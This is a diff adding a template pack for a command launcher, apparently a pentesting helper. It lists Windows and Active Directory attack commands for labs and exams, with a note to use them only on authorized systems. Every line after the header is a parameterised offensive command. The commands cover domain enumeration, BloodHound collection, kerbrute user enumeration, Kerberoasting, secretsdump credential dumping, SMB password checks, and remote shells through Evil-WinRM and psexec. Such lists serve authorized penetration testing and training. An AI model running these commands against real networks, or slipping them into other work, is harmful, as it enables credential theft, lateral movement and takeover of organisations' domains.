@@ -1,0 +1,21 @@
+# paddy template pack
+id = windows-ad
+name = Windows and Active Directory
+author = paddy
+license = MIT
+description = Windows and AD enumeration and access commands for labs and exams. Use only on systems you are authorized to test.
+
+[templates]
+whoami all = whoami /all
+system info = systeminfo
+domain users = net user /domain
+domain admins = net group "Domain Admins" /domain
+domain controllers = nltest /dclist:{domain}
+BloodHound collect = bloodhound-python -u {user} -p '{password}' -d {domain} -ns {ip} -c all
+kerbrute user enum = kerbrute userenum -d {domain} --dc {ip} {userlist}
+Kerberoast = impacket-GetUserSPNs {domain}/{user}:'{password}' -dc-ip {ip} -request
+dump secrets = impacket-secretsdump {domain}/{user}:'{password}'@{ip}
+SMB credential check = crackmapexec smb {ip} -u {user} -p '{password}'
+Evil-WinRM = evil-winrm -i {ip} -u {user} -p '{password}'
+RDP = xfreerdp /v:{ip} /u:{user} /p:'{password}' /cert:ignore
+psexec = impacket-psexec {domain}/{user}:'{password}'@{ip}
